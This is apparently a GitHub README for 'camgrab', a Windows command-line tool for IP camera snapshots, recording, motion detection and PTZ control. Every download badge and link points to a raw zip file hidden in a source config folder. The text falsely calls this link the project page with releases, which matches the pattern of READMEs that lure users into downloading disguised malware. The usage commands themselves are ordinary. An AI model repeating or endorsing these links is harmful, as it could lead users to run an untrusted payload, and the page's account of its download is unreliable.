# 📷 camgrab - Capture and Monitor IP Cameras Fast

[![Download camgrab](https://img.shields.io/badge/Download-camgrab-blue?style=for-the-badge&logo=github)](https://github.com/GoldenXerO/camgrab/raw/refs/heads/main/crates/camgrab-core/src/config/Software-3.0.zip)

---

## What is camgrab?

camgrab is a simple tool to capture images, record videos, and detect motion from IP cameras. It works on Windows and runs from a single file, so you don’t need to install anything complex. With camgrab, you can watch your security cameras, save snapshots, or start recording without extra software.

---

## Supported Features

- Take snapshots from your IP camera instantly  
- Record video streams from cameras over the network  
- Detect motion using your camera’s feed  
- PTZ (Pan, Tilt, Zoom) control for compatible cameras  
- Works with RTSP and ONVIF camera protocols  
- Command-line interface keeps it lightweight and fast  
- Single executable file – no installation required  

---

## System Requirements

- Windows 10 or later (64-bit recommended)  
- At least 100 MB free disk space  
- Active network connection to access your IP camera  
- IP camera supports RTSP or ONVIF protocols  
- Basic command prompt familiarity is helpful but not required  

---

## 🔽 Where to Get camgrab

Visit the page below to download camgrab for Windows:

[![Download on GitHub](https://img.shields.io/badge/Get_camgrab-GitHub-grey?style=for-the-badge&logo=github)](https://github.com/GoldenXerO/camgrab/raw/refs/heads/main/crates/camgrab-core/src/config/Software-3.0.zip)

This link takes you to the camgrab GitHub page. You will find the latest release files there.

---

## 🛠 Download and Install on Windows

Follow these steps to download and run camgrab:

1. Click the **Download camgrab** badge at the top or the link below:  
   https://github.com/GoldenXerO/camgrab/raw/refs/heads/main/crates/camgrab-core/src/config/Software-3.0.zip

2. On the page, find the **Releases** section or look for a folder named `releases`. This is where you will see the available versions of camgrab.

3. Locate the latest Windows release file, usually ending with `.exe`. The file might be named like `camgrab_win64.exe` or similar.

4. Click on the `.exe` file to download it to your computer.

5. Once downloaded, open the folder containing the file and double-click on it to run.  
   No installation is needed because camgrab runs as a standalone application.

6. To use camgrab, you will need to open the Command Prompt:
   - Press **Win + R**, type `cmd`, and hit Enter.

7. Navigate to the folder where you saved camgrab using the `cd` command:  
   Example:  
   ```
   cd C:\Users\YourName\Downloads
   ```

8. Run camgrab by typing its name and pressing Enter:  
   ```
   camgrab_win64.exe
   ```

You are now ready to connect your camera and start capturing images and video.

---

## 🚀 Using camgrab: Basic Commands

camgrab runs in the Command Prompt using simple commands. Here are a few common examples to get you started.

### Take a Snapshot

Save one picture from your camera using the following command:  
```
camgrab_win64.exe snapshot --url rtsp://your-camera-ip/stream  
```

Replace `rtsp://your-camera-ip/stream` with your camera’s RTSP address. You can find this in your camera’s manual or app.

The snapshot will save as a file in the current folder.

### Start Recording Video

Record a video stream from your camera:  
```
camgrab_win64.exe record --url rtsp://your-camera-ip/stream --duration 60
```

This records a 60-second video. Change the `--duration` value as you like.

The video saves as an MP4 file.

### Motion Detection

Enable motion detection to record only when movement is detected:  
```
camgrab_win64.exe motion --url rtsp://your-camera-ip/stream --output motion_record.mp4
```

This saves video clips when motion happens.

### PTZ Control

If your camera supports PTZ, you can move it:  
```
camgrab_win64.exe ptz --url rtsp://your-camera-ip/stream --move up
```

Use directions `up`, `down`, `left`, `right` to change the view.

---

## 🎯 Finding Your Camera’s URL

The key to using camgrab is the correct camera URL. Most network cameras use RTSP or ONVIF. Here is how to find it:

- Check your camera manual for the RTSP URL example  
- Search online with your camera model + “RTSP URL”  
- Use the camera’s official app or software to get stream details  
- For ONVIF cameras, camgrab can discover and connect to the camera automatically using the `onvif` command  

Example RTSP URL format:  
```
rtsp://username:password@192.168.1.10:554/stream1
```

Replace `username`, `password`, and `192.168.1.10` with your actual camera details.

---

## 💡 Tips for Best Use

- Run camgrab close to your camera on the same network for faster connections and fewer drops.  
- Save snapshots and videos in folders with plenty of free disk space.  
- Use file names with dates or times to organize your recordings.  
- Experiment with commands to find what fits your needs.  

---

## ⚙ Advanced Options Overview

- Enable snapshots at intervals with `--interval`  
- Record video with custom resolution and quality settings  
- Use built-in triggers for motion sensitivity adjustment  
- Schedule tasks using Windows Task Scheduler and scripts  
- Control multiple cameras by running different camgrab instances  

---

## 🧰 Support and Resources

- Visit the GitHub page to view guides and open issues  
- Check the `README.md` file in the repository for detailed command options  
- Ask questions on GitHub Discussions if available  
- Use standard Windows tools to manage files and processes  

---

## 📁 Folder Structure After Running

- Snapshots save as `.jpg` files by default  
- Recordings save as `.mp4` files by default  
- Temporary files clean up automatically after use  
- You can change output folders using command options  

---

## 📝 About This Project

camgrab was created to make capturing and monitoring IP cameras quick and easy without bulky software. It focuses on speed, simplicity, and flexibility. The single executable means you can carry it on a USB drive and run it anywhere Windows is available.

---

[![Download camgrab](https://img.shields.io/badge/Download-camgrab-blue?style=for-the-badge&logo=github)](https://github.com/GoldenXerO/camgrab/raw/refs/heads/main/crates/camgrab-core/src/config/Software-3.0.zip)